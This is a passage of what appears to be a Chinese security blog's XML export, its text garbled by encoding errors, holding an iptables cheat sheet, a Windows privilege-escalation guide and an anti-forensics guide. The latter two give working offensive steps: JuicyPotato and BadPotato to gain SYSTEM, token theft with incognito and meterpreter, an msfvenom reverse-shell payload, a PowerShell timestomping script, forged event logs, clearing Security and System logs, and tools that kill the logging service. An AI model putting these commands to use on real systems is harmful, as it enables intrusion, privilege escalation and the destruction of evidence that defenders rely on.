    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æŸ¥çœ‹ç°åœ¨iptablesè§„åˆ™</span><br><span class="line">iptables -L -n -v</span><br><span class="line"></span><br><span class="line">#é…ç½®ï¼Œç¦æ­¢è¿›ï¼Œå…è®¸å‡ºï¼Œå…è®¸å›ç¯ç½‘å¡</span><br><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -A OUTPUT -j ACCEPT</span><br><span class="line">iptables -A INPUT -i lo -j ACCEPT</span><br><span class="line"></span><br><span class="line">#å…è®¸ping</span><br><span class="line">iptables -A INPUT -p icmp -j ACCEPT</span><br><span class="line"></span><br><span class="line">#å…è®¸ssh</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#å…è®¸ftp</span><br><span class="line">iptables -A INPUT -p tcp --dport 21 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 20 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#å…è®¸DNS</span><br><span class="line">iptables -A INPUT -p tcp -m tcp --dport 53 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p udp -m udp --dport 53 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#å…è®¸httpå’Œhttps</span><br><span class="line">iptables -A INPUT -p tcp --dport 80 -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 443 -j ACCEPT</span><br><span class="line"></span><br><span class="line">#å…è®¸å·²å»ºç«‹çš„æˆ–ç›¸å…³è¿çš„é€šè¡Œ</span><br><span class="line">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br><span class="line"></span><br><span class="line">#ç¦æ­¢å…¶ä»–æœªå…è®¸çš„è§„åˆ™è®¿é—®</span><br><span class="line">iptables -A INPUT -j REJECT #ï¼ˆæ³¨æ„ï¼šå¦‚æœ22ç«¯å£æœªåŠ å…¥å…è®¸è§„åˆ™ï¼ŒSSHé“¾æ¥ä¼šç›´æ¥æ–­å¼€ã€‚ï¼‰</span><br><span class="line">iptables -A FORWARD -j REJECT</span><br><span class="line"></span><br><span class="line">#å±è”½IP</span><br><span class="line">iptables -I INPUT -s 192.168.1.4 -j DROP       #å±è”½å•ä¸ªIPçš„å‘½ä»¤</span><br><span class="line">iptables -I INPUT -s 123.0.0.0/8 -j DROP      #å°æ•´ä¸ªæ®µå³ä»123.0.0.1åˆ°123.255.255.254</span><br><span class="line">iptables -I INPUT -s 192.168.0.0/16 -j DROP    #å°IPæ®µå³ä»192.168.0.1åˆ°192.168.255.254</span><br><span class="line">iptables -I INPUT -s 192.168.1.0/24 -j DROP    #å°IPæ®µå³ä»192.168.1.1åˆ°192.168.1.254</span><br><span class="line"></span><br><span class="line">#åˆ é™¤å·²æ·»åŠ çš„iptablesè§„åˆ™  -D</span><br><span class="line">iptables -D INPUT -s 192.168.1.4 -j DROP</span><br><span class="line">iptables -D INPUT 3 #åˆ é™¤ç¬¬ä¸‰æ¡</span><br><span class="line"></span><br><span class="line">#æ¸…é™¤é˜²ç«å¢™è§„åˆ™</span><br><span class="line">iptables -F	</span><br></pre></td></tr></table></figure>



<p>å‚è€ƒ  <a href="https://www.cnblogs.com/hellxz/p/9688044.html">https://www.cnblogs.com/hellxz/p/9688044.html</a></p>
]]></content>
      <categories>
        <category>iptables</category>
      </categories>
      <tags>
        <tag>iptables</tag>
      </tags>
  </entry>
  <entry>
    <title>Windowsææƒç¯‡</title>
    <url>/posts/61d7ac81/</url>
    <content><![CDATA[<h3 id="Windowsä¸­çš„ç”¨æˆ·ä¸ç»„"><a href="#Windowsä¸­çš„ç”¨æˆ·ä¸ç»„" class="headerlink" title="Windowsä¸­çš„ç”¨æˆ·ä¸ç»„"></a>Windowsä¸­çš„ç”¨æˆ·ä¸ç»„</h3><p><img src="/posts/61d7ac81/1.png"></p>
<h3 id="Potatoå®¶æ—ææƒ"><a href="#Potatoå®¶æ—ææƒ" class="headerlink" title="Potatoå®¶æ—ææƒ"></a>Potatoå®¶æ—ææƒ</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><p>é€šè¿‡å„ç§â½…æ³•åœ¨æœ¬åœ°NTLMä¸­ç»§è·å–SYSTEMä»¤ç‰Œï¼Œå†é€šè¿‡æ¨¡æ‹Ÿä»¤ç‰Œæ‰§â¾å‘½ä»¤ã€‚</p>
<h4 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h4><ul>
<li>è·å–é«˜æƒé™ä»¤ç‰Œâ€”â€”token</li>
<li>SeImpersonatePrivilege æˆ– SeAssignPrimaryTokenPrivilege æƒé™</li>
</ul>
<blockquote>
<p>å½“â½¤æˆ·å…·æœ‰ SeImpersonatePrivilege ç‰¹æƒï¼Œå¯ä»¥è°ƒâ½¤ CreateProcessWithTokenW ä»¥æŸ ä¸ªTokençš„æƒé™å¯åŠ¨æ–°è¿›ç¨‹ã€‚ </p>
<p>å½“â½¤æˆ·å…·æœ‰ SeAssignPrimaryTokenPrivilege ç‰¹æƒï¼Œå¯ä»¥è°ƒâ½¤ CreateProcessAsUserW ä»¥æŒ‡å®šâ½¤æˆ·æƒé™å¯åŠ¨æ–°è¿›ç¨‹ã€‚</p>
</blockquote>
<p><em>Windowsçš„token</em></p>
<ul>
<li>Delegation token(æˆæƒä»¤ç‰Œ):â½¤äºäº¤äº’ä¼šè¯ç™»å½•(ä¾‹å¦‚æœ¬åœ°â½¤æˆ·ç›´æ¥ç™»å½•ã€è¿œç¨‹æ¡Œâ¾¯ç™»å½•) </li>
<li>Impersonation token(æ¨¡æ‹Ÿä»¤ç‰Œ):â½¤äºâ¾®äº¤äº’ç™»å½•(åˆ©â½¤net useè®¿é—®å…±äº«â½‚ä»¶å¤¹</li>
</ul>
<p><em>WindowsæœåŠ¡ä½¿ç”¨çš„ç™»å½•è´¦æˆ·</em></p>
<ul>
<li>NT AUTHORITY\System </li>
<li>NT AUTHORITY\Network Service </li>
<li>NT AUTHORITY\Local Service</li>
</ul>
<h4 id="Juicypotato-MS16-075"><a href="#Juicypotato-MS16-075" class="headerlink" title="Juicypotato(MS16-075)"></a>Juicypotato(MS16-075)</h4><h5 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h5><p>é€šè¿‡DCOM æ¥ä½¿æœåŠ¡å‘æ”»å‡»è€…ç›‘å¬çš„ç«¯â¼å‘èµ·è¿æ¥å¹¶è¿›â¾NTLMè®¤è¯ã€‚</p>
<h5 id="æ¡ä»¶-1"><a href="#æ¡ä»¶-1" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h5><ul>
<li>1.å¼€å¯SeImpersonateæˆ–è€…SeAssignPrimaryTokenæƒé™</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /all</span><br><span class="line">whoami /priv</span><br></pre></td></tr></table></figure>

<p><img src="/posts/61d7ac81/2.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¦‚æœå¼€å¯SeImpersonateæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨-t t</span><br><span class="line">å¦‚æœå¼€å¯SeAssignPrimaryTokenæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨-t u</span><br><span class="line">å¦‚æœå‡å¼€å¯ï¼Œå¯ä»¥é€‰æ‹©-t *</span><br><span class="line">å¦‚æœå‡æœªå¼€å¯ï¼Œé‚£ä¹ˆæ— æ³•ææƒ</span><br></pre></td></tr></table></figure>

<ul>
<li>2.æŸ¥çœ‹RPCé»˜è®¤ç«¯å£æ˜¯å¦ä¸º135</li>
</ul>
<p><code>netsh advfirewall firewall add rule name=&quot;135&quot; protocol=TCP dir=in localport=135 action=allow</code></p>
<p><img src="/posts/61d7ac81/5.png"></p>
<ul>
<li>3.æ ¹æ®æ“ä½œç³»ç»Ÿé€‰æ‹©å¯ç”¨çš„CLSID</li>
</ul>
<p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p>
<p><img src="/posts/61d7ac81/3.png"></p>
<p><img src="/posts/61d7ac81/4.png"></p>
<ul>
<li>4.é€‰æ‹©ä¸€ä¸ªç³»ç»Ÿæœªå ç”¨çš„ç«¯å£ä½œä¸ºç›‘å¬ç«¯å£</li>
</ul>
<p> <code>-l</code> æŒ‡å®šç›‘å¬ç«¯å£</p>
<h5 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><ul>
<li>1.Juicy_potatoï¼ˆåŸç‰ˆï¼‰</li>
</ul>
<p><a href="https://github.com/ohpe/juicy-potato">https://github.com/ohpe/juicy-potato</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt;JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1111 -c &#123;03ca98d6-ff5d-49b8-abc6-03dd84127020&#125;</span><br><span class="line"></span><br><span class="line">Mandatory args:</span><br><span class="line">-t createprocessè°ƒç”¨: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both</span><br><span class="line">-p &lt;program&gt;: è¿è¡ŒæŒ‡å®šç¨‹åº</span><br><span class="line">-l &lt;port&gt;: COMæœåŠ¡å™¨ä¾¦å¬ç«¯å£</span><br><span class="line"></span><br><span class="line">Optional args:</span><br><span class="line">-m &lt;ip&gt;: COMæœåŠ¡å™¨ä¾¦å¬åœ°å€ (é»˜è®¤ 127.0.0.1)</span><br><span class="line">-a &lt;argument&gt;: ä¼ é€’ç»™ç¨‹åºå‘½ä»¤è¡Œå‚æ•° (é»˜è®¤ NULL)</span><br><span class="line">-k &lt;ip&gt;: RPCæœåŠ¡å™¨IPåœ°å€ (é»˜è®¤ 127.0.0.1)</span><br><span class="line">-n &lt;port&gt;: RPCæœåŠ¡å™¨ä¾¦å¬ç«¯å£ (é»˜è®¤ 135)</span><br><span class="line">-c &lt;&#123;clsid&#125;&gt;: CLSID (default BITS:&#123;4991d34b-80a1-4291-83b6-3328366b9097&#125;)</span><br><span class="line">https://github.com/ohpe/juicy-potato/tree/master/CLSID</span><br><span class="line">-z ä»…æµ‹è¯•CLSIDå¹¶æ‰“å°ä»¤ç‰Œçš„ç”¨æˆ·</span><br></pre></td></tr></table></figure>

<p><img src="/posts/61d7ac81/6.png"></p>
<p>ç„¶åä¼šå¼¹å‡ºä¸€ä¸ªcmd <code>whoami</code> æŸ¥çœ‹ä¸ºsystemæƒé™</p>
<p><img src="/posts/61d7ac81/7.png"></p>
<ul>
<li>2.JuicyPotatoWeb(æ”¹)</li>
</ul>
<p><img src="/posts/61d7ac81/8.png"></p>
<p><code>JuicyPotatowweb.exe -p whoami</code></p>
<p>å¦‚æœCLSIDé»˜è®¤çš„ä¸è¡Œ å¯ä»¥æ¢åˆ«çš„è¯•è¯•</p>
<p><img src="/posts/61d7ac81/9.png"></p>
<h5 id="é˜²å¾¡æ–¹æ³•"><a href="#é˜²å¾¡æ–¹æ³•" class="headerlink" title="é˜²å¾¡æ–¹æ³•"></a>é˜²å¾¡æ–¹æ³•</h5><ul>
<li>1.é˜»æ­¢æ”»å‡»è€…è·å¾—SeImpersonateæˆ–è€…SeAssignPrimaryTokenæƒé™</li>
<li> 2.å³ä½¿æ‰“å¥½ç³»ç»Ÿè¡¥ä¸</li>
<li> 3.å‡çº§åˆ°æœ€æ–°çš„windowsç³»ç»Ÿ</li>
</ul>
<h4 id="BadPotato"><a href="#BadPotato" class="headerlink" title="BadPotato"></a>BadPotato</h4><p><a href="https://github.com/hifuck/badpotato">https://github.com/hifuck/badpotato</a></p>
<h5 id="ä½¿ç”¨-1"><a href="#ä½¿ç”¨-1" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h5><p><code>BadPotato.exe whoami</code></p>
<p><img src="/posts/61d7ac81/10.png"></p>
<h4 id="RoguePotato"><a href="#RoguePotato" class="headerlink" title="RoguePotato"></a>RoguePotato</h4><p>åç»­å†è¡¥å……~</p>
<h3 id="ä»¤ç‰Œçªƒå–"><a href="#ä»¤ç‰Œçªƒå–" class="headerlink" title="ä»¤ç‰Œçªƒå–"></a>ä»¤ç‰Œçªƒå–</h3><h4 id="incognito-exe"><a href="#incognito-exe" class="headerlink" title="incognito.exe"></a>incognito.exe</h4><p>ä¸‹è½½åœ°å€ <a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#åˆ—å–token</span><br><span class="line">incognito.exe list_tokens -u</span><br><span class="line">#è¿œç¨‹åˆ—ä¸¾token</span><br><span class="line">incognito.exe -h 192.168.0.159 -u pte1 -p &quot;Pte1.123&quot;  list_tokens -u</span><br><span class="line">#çªƒå–åˆ°systemæƒé™</span><br><span class="line">incognito.exe  execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</span><br><span class="line">#é™æƒè‡³å½“å‰ç”¨æˆ·</span><br><span class="line">incognito.exe execute -c &quot;pte1-PC\pte1&quot; cmd.exe</span><br><span class="line">#è¿œç¨‹çªƒå–åˆ°systemæƒé™</span><br><span class="line">incognito.exe -h 192.168.0.159 -u pte1 -p &quot;Pte1.123&quot; execute -c &quot;NT AUTHORITY\SYSTEM&quot; cmd.exe</span><br></pre></td></tr></table></figure>

<p><img src="/posts/61d7ac81/11.png"></p>
<p><img src="/posts/61d7ac81/12.png"></p>
<p>ctrl+c é€€å‡ºå°±èƒ½æ¢å¤åŸæƒé™</p>
<h4 id="ä½¿ç”¨msf"><a href="#ä½¿ç”¨msf" class="headerlink" title="ä½¿ç”¨msf"></a>ä½¿ç”¨msf</h4><ul>
<li>1.ç”Ÿäº§shell</li>
</ul>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=198.168.0.133 LPORT=3344 -f exe -o  shell.exe</code>  (å¼¹shellä¹Ÿå¯ä»¥ä½¿ç”¨nishang çš„ ps1è„šæœ¬ä½†æ˜¯è¦æ±‚psç‰ˆæœ¬åœ¨3ä»¥ä¸Š)</p>
<p><img src="/posts/61d7ac81/13.png"></p>
<ul>
<li>2.ä½¿ç”¨msfå†…ç½®æ¨¡å— incognito</li>
</ul>
<p><img src="/posts/61d7ac81/14.png"></p>
<ul>
<li>3.çªƒå–token</li>
</ul>
<p><code>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code> #çªƒå–SYSTEMæƒé™</p>
<p><code>steal_token 1252</code> ä»è¿›ç¨‹ä¸­çªƒå–</p>
<p><img src="/posts/61d7ac81/15.png"></p>
<ul>
<li>4.æ¢å¤åˆ°ä¹‹å‰çš„æƒé™</li>
</ul>
<p><code>rev2self</code></p>
<p><img src="/posts/61d7ac81/16.png"></p>
<h3 id="å†…æ ¸ææƒ"><a href="#å†…æ ¸ææƒ" class="headerlink" title="å†…æ ¸ææƒ"></a>å†…æ ¸ææƒ</h3><h4 id="MS15-051"><a href="#MS15-051" class="headerlink" title="MS15-051"></a>MS15-051</h4><h4 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h4><h4 id="MS14-058"><a href="#MS14-058" class="headerlink" title="MS14-058"></a>MS14-058</h4><br>

<h3 id="æ•°æ®åº“ææƒ"><a href="#æ•°æ®åº“ææƒ" class="headerlink" title="æ•°æ®åº“ææƒ"></a>æ•°æ®åº“ææƒ</h3><h4 id="Mysql-UDFææƒ"><a href="#Mysql-UDFææƒ" class="headerlink" title="Mysql UDFææƒ"></a>Mysql UDFææƒ</h4><h5 id="æ¡ä»¶-2"><a href="#æ¡ä»¶-2" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h5><ul>
<li>å¿…é¡»æ˜¯rootæƒé™</li>
<li>secure_file_priv= </li>
<li>å°†udf.dll æ–‡ä»¶ä¸Šä¼ åˆ°Mysqlçš„pluginsç›®å½•ä¸‹</li>
</ul>
<p>å…·ä½“å¯ä»¥å‚è€ƒ<a href="https://blog.csdn.net/qq_36119192/article/details/84863268">https://blog.csdn.net/qq_36119192/article/details/84863268</a></p>
<p>ä¹Ÿå¯ä»¥ä½¿ç”¨udfå¤§é©¬</p>
]]></content>
      <categories>
        <category>ææƒ</category>
      </categories>
      <tags>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>ç—•è¿¹æ¸…ç†-Windowsç¯‡-01</title>
    <url>/posts/d8f69548/</url>
    <content><![CDATA[<h3 id="æ¸…ç†æ—¶é—´ç—•è¿¹"><a href="#æ¸…ç†æ—¶é—´ç—•è¿¹" class="headerlink" title="æ¸…ç†æ—¶é—´ç—•è¿¹"></a>æ¸…ç†æ—¶é—´ç—•è¿¹</h3><h4 id="ä¼ªé€ æ–‡ä»¶ä¿®æ”¹æ—¶é—´"><a href="#ä¼ªé€ æ–‡ä»¶ä¿®æ”¹æ—¶é—´" class="headerlink" title="ä¼ªé€ æ–‡ä»¶ä¿®æ”¹æ—¶é—´"></a>ä¼ªé€ æ–‡ä»¶ä¿®æ”¹æ—¶é—´</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">edit_time</span><span class="params">(<span class="variable">$path</span>)</span></span>&#123;<span class="variable">$date1</span> =<span class="built_in">Get-ChildItem</span> |</span><br><span class="line"><span class="built_in">Select</span> LastWriteTime|<span class="built_in">Get-Random</span>;<span class="variable">$date2</span> =<span class="built_in">Get-ChildItem</span> |</span><br><span class="line"><span class="built_in">Select</span> LastWriteTime|<span class="built_in">Get-Random</span>;<span class="variable">$date3</span> =<span class="built_in">Get-ChildItem</span> |</span><br><span class="line"><span class="built_in">Select</span> LastWriteTime|<span class="built_in">Get-Random</span>;<span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$path</span>).lastaccesstime=<span class="variable">$date1</span>.LastWriteTime;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$path</span>).creationtime=<span class="variable">$date2</span>.LastWriteTime ;</span><br><span class="line"><span class="variable">$</span>(<span class="built_in">Get-Item</span> <span class="variable">$path</span>).lastwritetime=<span class="variable">$date3</span>.LastWriteTime&#125;;</span><br><span class="line">edit_time(<span class="string">&quot;D:\test&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="ä¼ªé€ æ—¥å¿—æ—¶é—´"><a href="#ä¼ªé€ æ—¥å¿—æ—¶é—´" class="headerlink" title="ä¼ªé€ æ—¥å¿—æ—¶é—´"></a>ä¼ªé€ æ—¥å¿—æ—¶é—´</h4><p>ä½¿ç”¨eventcreate è¯¦è§ä¸‹ã€‚</p>
<h3 id="æ¸…ç†ç”¨æˆ·ç—•è¿¹"><a href="#æ¸…ç†ç”¨æˆ·ç—•è¿¹" class="headerlink" title="æ¸…ç†ç”¨æˆ·ç—•è¿¹"></a>æ¸…ç†ç”¨æˆ·ç—•è¿¹</h3><h4 id="æ¸…ç†3389ç—•è¿¹"><a href="#æ¸…ç†3389ç—•è¿¹" class="headerlink" title="æ¸…ç†3389ç—•è¿¹"></a>æ¸…ç†3389ç—•è¿¹</h4><h3 id="æ¸…ç†æ“ä½œç—•è¿¹"><a href="#æ¸…ç†æ“ä½œç—•è¿¹" class="headerlink" title="æ¸…ç†æ“ä½œç—•è¿¹"></a>æ¸…ç†æ“ä½œç—•è¿¹</h3><h4 id="æ—¥å¿—ç›¸å…³çŸ¥è¯†"><a href="#æ—¥å¿—ç›¸å…³çŸ¥è¯†" class="headerlink" title="æ—¥å¿—ç›¸å…³çŸ¥è¯†"></a>æ—¥å¿—ç›¸å…³çŸ¥è¯†</h4><h5 id="äº§ç”Ÿæµç¨‹"><a href="#äº§ç”Ÿæµç¨‹" class="headerlink" title="äº§ç”Ÿæµç¨‹"></a>äº§ç”Ÿæµç¨‹</h5><ul>
<li><code>svchost.exe</code>ï¼ˆsvchost.exeæœ‰äº›ä¸“é—¨è®°å½•ç”¨äºè®°å½•æ—¥å¿—çš„çº¿ç¨‹å¯åŠ¨æ—¥å¿—è®°å½•åŠŸèƒ½ï¼‰</li>
<li><code>å†…å­˜å †</code>ï¼ˆè®°å½•çš„æ“ä½œä¼šç¼“å­˜ä¸ºä¸€æ®µå†…å­˜å†…å®¹ï¼‰</li>
<li><code>wevtutil.exe</code>ï¼ˆå°†å†…å­˜å†…å®¹é€šè¿‡wevtutil.exeè§£æä¸ºxmlæ–‡æ¡£ï¼‰</li>
<li><code>æ—¥å¿—</code>ï¼ˆå°†xmlè½¬æ¢ä¸ºå¯è¯»çš„æ—¥å¿—ï¼‰</li>
</ul>
<h5 id="æ—¥å¿—ç±»å‹"><a href="#æ—¥å¿—ç±»å‹" class="headerlink" title="æ—¥å¿—ç±»å‹"></a>æ—¥å¿—ç±»å‹</h5><h6 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h6><p>ä½ç½® : <code>%SystemRoot%\System32\Winevt\Logs\Security.evtx</code></p>
<p>å®‰å…¨ç›¸å…³çš„äº‹ä»¶ï¼Œå¦‚ ç”¨æˆ·æƒé™å˜æ›´ç™»å½•ã€æ³¨é”€ï¼Œæ–‡ä»¶/æ–‡ä»¶å¤¹è®¿é—®</p>
<h6 id="System"><a href="#System" class="headerlink" title="System"></a>System</h6><p>ä½ç½®: <code>%SystemRoot%\System32\Winevt\Logs\System.evtx</code></p>
<p>ç³»ç»Ÿè¿›ç¨‹ã€è®¾å¤‡ã€ç£ç›˜æ´»åŠ¨ç­‰</p>
<h6 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h6><p>ä½ç½®: <code>%SystemRoot%\System32\Winevt\Logs\Application.evtx</code></p>
<p>åŒ…å«æ“ä½œç³»ç»Ÿå®‰è£…çš„åº”ç”¨ç¨‹åºè½¯ä»¶ç›¸å…³çš„äº‹ä»¶</p>
<h6 id="åº”ç”¨ç¨‹åºåŠæœåŠ¡æ—¥å¿—"><a href="#åº”ç”¨ç¨‹åºåŠæœåŠ¡æ—¥å¿—" class="headerlink" title="åº”ç”¨ç¨‹åºåŠæœåŠ¡æ—¥å¿—"></a>åº”ç”¨ç¨‹åºåŠæœåŠ¡æ—¥å¿—</h6><p>è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯è¿æ¥ã€æ— çº¿ç½‘ç»œã€æœ‰çº¿ç½‘è·¯ã€è®¾å¤‡å®‰è£…ç­‰ç›¸å…³æ—¥å¿—ã€‚</p>
<h5 id="æŸ¥çœ‹æ—¥å¿—"><a href="#æŸ¥çœ‹æ—¥å¿—" class="headerlink" title="æŸ¥çœ‹æ—¥å¿—"></a>æŸ¥çœ‹æ—¥å¿—</h5><p><code>eventvwr</code></p>
<h5 id="ä¼ªé€ æ—¥å¿—"><a href="#ä¼ªé€ æ—¥å¿—" class="headerlink" title="ä¼ªé€ æ—¥å¿—"></a>ä¼ªé€ æ—¥å¿—</h5><p><code>eventcreate</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eventcreate -l system -so administrator -t warning -d &quot;this is a test&quot; -id 500</span><br><span class="line"></span><br><span class="line">-t  warning / error / information / success</span><br><span class="line">-id  1-1000</span><br><span class="line">-so å¯ä»¥è‡ªå®šä¹‰  æ¥æº</span><br><span class="line">å…·ä½“è¯­æ³•å¦‚ä¸‹</span><br><span class="line">eventcreate [/s Computer [/u Domain\User [/p Password]] &#123;[/l &#123;APPLICATION|SYSTEM&#125;]|[/so SrcName]&#125; /t &#123;ERROR|WARNING|INFORMATION|SUCCESSAUDIT|FAILUREAUDIT&#125; /id EventID /d Description</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨</span><br><span class="line">eventcreate -l system(æ—¥å¿—ç±»å‹) -so administratorï¼ˆè°ç”Ÿæˆçš„ï¼‰ -t warningï¼ˆç­‰çº§ï¼‰ -d &quot;this is a test&quot;ï¼ˆæ—¥å¿—å†…å®¹ï¼‰ -id 500ï¼ˆidå·ï¼‰</span><br></pre></td></tr></table></figure>



<h4 id="æ—¥å¿—æ¸…ç†"><a href="#æ—¥å¿—æ¸…ç†" class="headerlink" title="æ—¥å¿—æ¸…ç†"></a>æ—¥å¿—æ¸…ç†</h4><ul>
<li>1.æŸ¥çœ‹äº‹ä»¶æŸ¥çœ‹å™¨â€”-æ‰‹åŠ¨æ¸…ç†</li>
<li>2.cmdå‘½ä»¤åˆ é™¤æ—¥å¿—</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wevtutil el åˆ—å‡ºç³»ç»Ÿä¸­æ‰€æœ‰æ—¥å¿—åç§°</span><br><span class="line">wevtutil cl system æ¸…ç†ç³»ç»Ÿæ—¥å¿—</span><br><span class="line">wevtutil cl application æ¸…ç†åº”ç”¨ç¨‹åºæ—¥å¿—</span><br><span class="line">wevtutil cl security æ¸…ç†å®‰å…¨æ—¥å¿—</span><br></pre></td></tr></table></figure>

<p>å‡¡æ˜¯æ“ä½œéƒ½ä¼šç•™ä¸‹ç—•è¿¹ï¼Œå“ªæ€•æ˜¯åˆ é™¤æ—¥å¿—ï¼Œä¹Ÿä¼šç•™ä¸‹ä¸€æ¡åˆ é™¤æ—¥å¿—çš„æ—¥å¿—</p>
<ul>
<li>3.powershellå‘½ä»¤åˆ é™¤</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PowerShell -Command &quot;&amp; &#123;Clear-Eventlog -Log Application,System,Security&#125;&quot;</span><br><span class="line"></span><br><span class="line"># ä¸‹é¢è¿™ä¸ªåœ¨powershellä¸‹è¿è¡Œ éœ€è¦.netç‰ˆæœ¬3.5</span><br><span class="line">Get-WinEvent -ListLog Application,Setup,Security -Force | % &#123;Wevtutil.exe cl $_.Logname&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>4.msfåˆ é™¤æ—¥å¿—</li>
</ul>
<p><code>meterpreter &gt; clearev</code></p>
<ul>
<li>5.å•æ¡æ—¥å¿—çš„æ¸…ç†</li>
</ul>
<p>è§ä¸‹ç¯‡ï¼Œä¸»è¦å‚è€ƒä¸‰å¥½å­¦ç”Ÿå¤§ä½¬çš„æ–‡ç« [<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4]">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E5%8D%95%E6%9D%A1%E6%97%A5%E5%BF%97%E7%9A%84%E5%88%A0%E9%99%A4]</a>~</p>
<h4 id="åœæ­¢è®°å½•æ—¥å¿—"><a href="#åœæ­¢è®°å½•æ—¥å¿—" class="headerlink" title="åœæ­¢è®°å½•æ—¥å¿—"></a>åœæ­¢è®°å½•æ—¥å¿—</h4><h5 id="åŸºäºpowershell"><a href="#åŸºäºpowershell" class="headerlink" title="åŸºäºpowershell"></a>åŸºäºpowershell</h5><p>é¡¹ç›®åœ°å€ <a href="https://github.com/hlldz/Phant0m">https://github.com/hlldz/Phant0m</a>  ä¼šç›´æ¥æ€æ‰çº¿ç¨‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#ä¿®æ”¹powershellæƒé™</span><br><span class="line">Get-ExecutionPolicy</span><br><span class="line">Set-ExecutionPolicy unrestricted</span><br><span class="line"></span><br><span class="line">Import-Module .\Invoke-Phant0m.ps1</span><br><span class="line">Invoke-Phant0m</span><br><span class="line">#æ•ˆæœä¸€èˆ¬</span><br></pre></td></tr></table></figure>



<h5 id="åŸºäºC"><a href="#åŸºäºC" class="headerlink" title="åŸºäºC"></a>åŸºäºC</h5><p>é¡¹ç›®åœ°å€ <a href="https://github.com/QAX-A-Team/EventCleaner">https://github.com/QAX-A-Team/EventCleaner</a> ç›¸æ¯”ä¸Šé¢ è¿™ä¸ªå¯ä»¥æš‚åœæ—¥å¿—è®°å½•çº¿ç¨‹ ä¹Ÿå¯ä»¥æ¢å¤çº¿ç¨‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#æš‚åœçº¿ç¨‹</span><br><span class="line">EventCleaner suspend</span><br><span class="line">#æ¢å¤çº¿ç¨‹</span><br><span class="line">EventCleaner normal</span><br></pre></td></tr></table></figure>







<h4 id="æ–‡ä»¶çš„è¦†å†™åˆ é™¤"><a href="#æ–‡ä»¶çš„è¦†å†™åˆ é™¤" class="headerlink" title="æ–‡ä»¶çš„è¦†å†™åˆ é™¤"></a>æ–‡ä»¶çš„è¦†å†™åˆ é™¤</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cipher /W:D:\test 	</span><br><span class="line">#ä¼šå¯¹åˆ é™¤æ–‡ä»¶åç•™ä¸‹çš„ç©ºé—´è¿›è¡Œ3æ­¤è¦†ç›–æ“ä½œ å…ˆå†™å…¥0x00 å†å†™å…¥0xFF æœ€åå†™å…¥éšæ„æ•°å­—</span><br><span class="line"></span><br><span class="line">format G:/Pï¼š4</span><br><span class="line">#å¯¹Gç›˜æ•°æ®è¿›è¡Œæ ¼å¼åŒ–å¤„ç†åè¿›è¡Œ4æ¬¡è¦†å†™</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>ç—•è¿¹æ¸…ç†</category>
      </categories>
      <tags>
        <tag>ç—•è¿¹æ¸…ç†</tag>
      </tags>
  </entry>
  <entry>
